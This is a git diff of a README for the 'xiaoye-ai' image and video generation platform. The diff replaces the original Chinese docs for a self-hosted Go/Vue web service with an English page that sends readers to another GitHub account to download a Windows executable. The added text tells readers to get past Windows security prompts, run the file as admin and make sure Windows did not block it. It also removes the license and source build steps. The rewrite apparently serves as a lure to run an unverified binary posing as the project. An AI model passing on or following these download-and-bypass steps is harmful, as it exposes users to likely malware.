@@ -1,213 +1,237 @@
-# 小野AI 内容创作平台
+# 🎨 xiaoye-ai - Create images and videos fast
 
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
+[![Download xiaoye-ai](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Lawrenc7899/xiaoye-ai)
 
-开源多模态 AI 内容创作平台，支持 Google Gemini、火山引擎 Seedream/Seedance 等模型进行图像和视频生成。
+## 🚀 What xiaoye-ai does
 
-**在线体验: [https://xiaoye.io](https://xiaoye.io)**
+xiaoye-ai is a multi-modal AI content creation platform for images and video. It helps you turn text into visuals with support for Google Gemini, Volcano Engine Seedream, and Seedance models.
 
-[中文](#功能特性) | [English](README_EN.md)
+Use it to:
 
-## 截图预览
+- Create AI images from text prompts
+- Generate short videos from text or image input
+- Switch between different models with one app
+- Work with a simple desktop style interface
+- Keep your creative work in one place
 
-| 灵感广场                                 | 生成界面                                      |
-|--------------------------------------|-------------------------------------------|
-| ![生成](docs/screenshots/generate.png) | ![灵感广场](docs/screenshots/inspiration.png) |
+## 📥 Download and install
 
-## 功能特性
+1. Open the download page: [https://github.com/Lawrenc7899/xiaoye-ai](https://github.com/Lawrenc7899/xiaoye-ai)
+2. Look for the latest release or the main app files on the page
+3. Download the Windows version or the file marked for desktop use
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to run it
 
-- **AI 图像生成** — 多模型切换 (Gemini, Seedream)，支持参考图，最高 4K 分辨率
-- **AI 视频生成** — 文生视频 & 图生视频 (Seedance, Veo 3.1)，异步任务轮询
-- **电商图片批量生成** — 模板化批量生成商品图
-- **提示词优化** — 基于 DeepSeek 的 AI 提示词改写
-- **反向提示词** — 从图片提取生成提示词
-- **灵感广场** — 社区作品展示，点赞、Remix、审核
-- **积分系统** — 密钥兑换、每日签到、邀请奖励、在线充值
-- **用户系统** — 邮箱注册登录、Linux.do OAuth、邮箱绑定
-- **国际化** — 中文 & 英文
+If Windows shows a security prompt, choose the option that lets the app run.
 
-## 技术栈
+## 🖥️ Windows system needs
 
-| 层级 | 技术 |
-|------|------|
-| 前端 | Vue 3, Naive UI, Pinia, Vue Router, Vite |
-| 后端 | Go (Gin), GORM, MySQL, JWT |
-| AI 供应商 | Google Gemini, 火山引擎 (豆包) |
-| 存储 | 阿里云 OSS |
-| 管理后台 | Vue 3 SPA (独立构建) |
+For smooth use, your PC should meet these basic needs:
 
-## 项目结构
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 10 GB of free disk space
+- A stable internet connection
+- A modern GPU helps with image and video generation
+- A screen size of 1366 × 768 or higher
 
-```
-.
-├── frontend/                # Vue 3 前端应用
-│   └── src/
-│       ├── views/           # 页面
-│       ├── components/      # 可复用组件
-│       ├── composables/     # 组合式 API hooks
-│       ├── stores/          # Pinia 状态管理
-│       ├── locales/         # 国际化 (zh/en)
-│       └── router/
-├── frontend-admin/          # 管理后台审核面板
-├── backend/
-│   ├── cmd/                 # CLI 工具 (密钥生成等)
-│   ├── internal/
-│   │   ├── api/             # HTTP 处理器 & 中间件
-│   │   ├── api/admin/       # 管理后台 API
-│   │   ├── auth/            # JWT 认证
-│   │   ├── config/          # 环境配置
-│   │   ├── db/              # 数据库模型 & 初始化
-│   │   ├── email/           # SMTP 邮件服务
-│   │   ├── payment/         # 支付集成
-│   │   ├── provider/        # AI 供应商适配器
-│   │   └── storage/         # OSS 存储
-│   └── migrations/          # SQL 迁移脚本
-└── LICENSE
-```
+## 🧭 First-time setup
 
-## 快速开始
+After you open the app for the first time, follow these steps:
 
-### 环境要求
+1. Go to the settings page
+2. Add your API key for the model you want to use
+3. Pick a model such as Gemini, Seedream, or Seedance
+4. Set your output folder
+5. Save your settings
+6. Create a test image or video
 
-- Go 1.21+
-- Node.js 18+
-- MySQL 8.0+
-- 阿里云 OSS 存储桶 (用于媒体存储)
-- 至少一个 AI 供应商 API Key (Google Gemini 或火山引擎)
+If the app asks for a key or token, paste it into the matching field. Keep the key private.
 
-### 后端
+## ✨ Main features
 
-```bash
-cd backend
-cp .env.example .env    # 编辑 .env 填入你的配置
-go run main.go          # 启动于 :8092
-```
+### 🖼️ Image generation
 
-### 前端
+Create still images from plain text. You can describe people, scenes, products, or art styles. The app sends your prompt to the model and returns a generated image.
 
-```bash
-cd frontend
-npm install
-npm run dev             # 启动于 http://localhost:5173
-```
+Common uses:
 
-### 管理后台
+- Social media posts
+- Product mockups
+- Cover art
+- Concept images
+- Poster drafts
 
-```bash
-cd frontend-admin
-npm install
-npm run dev             # 启动于 http://localhost:5174
-```
+### 🎬 Video generation
 
-## 配置说明
+Create short video clips from text or image input. This works well for scene ideas, motion tests, and short content drafts.
 
-所有配置通过环境变量管理。复制 `backend/.env.example` 为 `backend/.env` 并填入对应值。
+Common uses:
 
-### 必填项
+- Motion concepts
+- Short clips for content posts
+- Storyboard tests
+- Visual scene drafts
 
-| 变量 | 说明 |
-|------|------|
-| `DB_USER` | MySQL 用户名 |
-| `DB_PASSWORD` | MySQL 密码 |
-| `DB_NAME` | MySQL 数据库名 |
-| `JWT_SECRET` | JWT 签名密钥 (使用强随机字符串) |
-| `GOOGLE_API_KEY` | Google Gemini API Key ([获取](https://aistudio.google.com/app/apikey)) |
+### 🔄 Multi-model support
 
-### 可选项
+xiaoye-ai supports more than one model, so you can choose the one that fits your task.
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `DB_HOST` | MySQL 主机 | `localhost` |
-| `DB_PORT` | MySQL 端口 | `3306` |
-| `PORT` | 后端服务端口 | `8092` |
-| `HTTP_PROXY` | 外部 API 调用代理 | - |
-| `ARK_API_KEY` | 火山引擎 API Key (Seedream/Seedance) | - |
-| `DEEPSEEK_API_KEY` | DeepSeek API Key (提示词优化) | - |
-| `DEEPSEEK_BASE_URL` | DeepSeek API 基础地址 | `https://api.deepseek.com` |
-| `DEEPSEEK_MODEL` | DeepSeek 模型名 | `deepseek-chat` |
-| `PROMPT_OPTIMIZE_CREDITS` | 提示词优化消耗积分 | `1` |
-| `OSS_ENDPOINT` | 阿里云 OSS Endpoint | - |
-| `OSS_ACCESS_KEY_ID` | OSS Access Key ID | - |
-| `OSS_ACCESS_KEY_SECRET` | OSS Access Key Secret | - |
-| `OSS_BUCKET_NAME` | OSS 存储桶名 | - |
-| `OSS_REGION` | OSS 地域 | - |
-| `OSS_PUBLIC_DOMAIN` | OSS 自定义域名 | - |
-| `SMTP_HOST` | SMTP 服务器地址 | - |
-| `SMTP_PORT` | SMTP 端口 | - |
-| `SMTP_USER` | SMTP 用户名 | - |
-| `SMTP_PASSWORD` | SMTP 密码 / 授权码 | - |
-| `SMTP_FROM_EMAIL` | 发件人邮箱 | - |
-| `SMTP_FROM_NAME` | 发件人名称 | - |
-| `ADMIN_TOKEN` | 管理后台认证 Token | - |
-| `INSPIRATION_AUTO_APPROVE` | 灵感帖子自动审核通过 | `false` |
-| `CORS_ORIGINS` | CORS 允许来源 (逗号分隔) | `http://localhost:5173,http://localhost:5174` |
-| `LINUXDO_CLIENT_ID` | Linux.do OAuth Client ID | - |
-| `LINUXDO_CLIENT_SECRET` | Linux.do OAuth Client Secret | - |
-| `OAUTH_REDIRECT_URL` | OAuth 回调地址 | - |
-| `LINUXDO_CREDIT_PID` | Linux.do Credit 商户 ID | - |
-| `LINUXDO_CREDIT_KEY` | Linux.do Credit 商户密钥 | - |
-| `LINUXDO_CREDIT_NOTIFY_URL` | 支付回调地址 | - |
-| `LINUXDO_CREDIT_RETURN_URL` | 支付完成跳转地址 | - |
+- Google Gemini for general AI tasks
+- Volcano Engine Seedream for image generation
+- Volcano Engine Seedance for video generation
 
-## 数据库
+### 🧩 Simple workflow
 
-后端使用 GORM 自动迁移，首次启动时自动创建表结构。`backend/migrations/` 目录下的 SQL 脚本供参考和手动变更使用。
+The app keeps the process direct:
 
-## 部署
+1. Enter a prompt
+2. Pick a model
+3. Start generation
+4. Save the result
 
-### 生产构建
+## 🛠️ How to use it
 
-```bash
-# 前端
-cd frontend && npm run build        # 产物: frontend/dist/
+### Step 1: Open the app
 
-# 管理后台
-cd frontend-admin && npm run build  # 产物: frontend-admin/dist/
+Double-click the app file after you download and extract it.
 
-# 后端
-cd backend && go build -o server main.go
-```
+### Step 2: Choose a model
 
-### Nginx 配置示例
+Pick the model that matches your task:
 
-```nginx
-server {
-    listen 443 ssl;
-    server_name your-domain.com;
+- Image work: Seedream or Gemini
+- Video work: Seedance
+- Mixed tasks: Gemini
 
-    # 前端
-    location / {
-        root /path/to/frontend/dist;
-        try_files $uri $uri/ /index.html;
-    }
+### Step 3: Enter your prompt
 
-    # 后端 API
-    location /api/ {
-        proxy_pass http://127.0.0.1:8092;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-    }
-}
-```
+Write a clear prompt with these parts:
 
-生产环境在 `.env` 中设置 `CORS_ORIGINS=https://your-domain.com`。
+- Subject
+- Scene
+- Style
+- Color
+- Mood
+- Output type
 
-## 参与贡献
+Example prompts:
 
-1. Fork 本仓库
-2. 创建功能分支 (`git checkout -b feature/amazing-feature`)
-3. 提交更改 (`git commit -m 'Add amazing feature'`)
-4. 推送分支 (`git push origin feature/amazing-feature`)
-5. 发起 Pull Request
+- A red sports car on a city street at night, cinematic light
+- A clean product shot of a white water bottle on a blue background
+- A short sci-fi video of a drone flying through a rainy city
 
-## 未来功能
+### Step 4: Start generation
 
-- **画布支持** — 可视化画布编辑器，支持图层操作、局部重绘与自由拼接
+Click the generate button in the app. Wait for the result to finish.
 
-## 致谢
+### Step 5: Save your file
 
-感谢 [Linux.do](https://linux.do) 社区的交流与支持，项目的许多想法和改进都来自社区成员的反馈。
+After the result appears, save it to your folder. Keep your files organized by project or date.
 
-## 开源协议
+## 🎯 Best prompt tips
 
-本项目基于 [AGPL-3.0](LICENSE) 协议开源。如果你将修改后的版本部署为网络服务，必须向该服务的用户公开源代码。
+Use short and clear prompts. Add the parts that matter most.
+
+Good prompt pattern:
+
+- What you want
+- Where it is
+- What it looks like
+- What style you want
+
+Examples:
+
+- A golden retriever running in a field, bright daylight, realistic style
+- A modern desk setup with a laptop and coffee cup, soft light, clean background
+- A neon city street at night, rain on the road, cyberpunk look
+
+If the result is not what you want, change one part at a time. Try a different subject, style, or color.
+
+## 📂 Suggested folder setup
+
+Keep your work easy to find:
+
+- `Projects`
+- `Images`
+- `Videos`
+- `Exports`
+- `Prompts`
+
+This helps when you create many files and want to find them later.
+
+## 🔧 Common problems
+
+### App does not open
+
+- Make sure you downloaded the full file
+- Extract the ZIP file before opening it
+- Try running the app as admin
+- Check that Windows did not block the file
+
+### Generation does not start
+
+- Check your internet connection
+- Make sure your API key is correct
+- Confirm that the model is available
+- Try again after a short wait
+
+### Results look wrong
+
+- Make the prompt more specific
+- Remove extra words
+- Use a simpler scene
+- Try another model
+
+### Files are hard to find
+
+- Change the save path in settings
+- Use one folder for each project
+- Rename files right after export
+
+## 🔒 API key use
+
+The app uses model service keys to talk to external AI services. Add only the keys you own. Do not share them in public chat or in uploaded files.
+
+## 🧪 Example use cases
+
+- A creator makes social media images for a weekly post plan
+- A marketer drafts product visuals for a landing page
+- A designer tests scene ideas before final work
+- A video editor creates quick motion drafts
+- A hobby user makes art from text ideas
+
+## 📌 Recommended workflow
+
+1. Open the app
+2. Set your model key
+3. Choose image or video mode
+4. Write a clear prompt
+5. Generate the result
+6. Save the output
+7. Adjust the prompt and try again
+
+## 🖱️ Download again if needed
+
+If you need to return to the download page, use this link:
+
+[Visit the xiaoye-ai GitHub page](https://github.com/Lawrenc7899/xiaoye-ai)
+
+## 📁 File handling on Windows
+
+If Windows asks what to do with the file:
+
+- For `.zip`, extract it first
+- For `.exe`, double-click it to run
+- For `.msi`, double-click it and follow the install steps
+
+If the file opens in another app, right-click it and choose the correct action
+
+## 🧭 Good habits for smooth use
+
+- Keep the app in one folder
+- Do not rename files while the app is running
+- Use clear prompt text
+- Save your work often
+- Update to the latest release when a new one appears
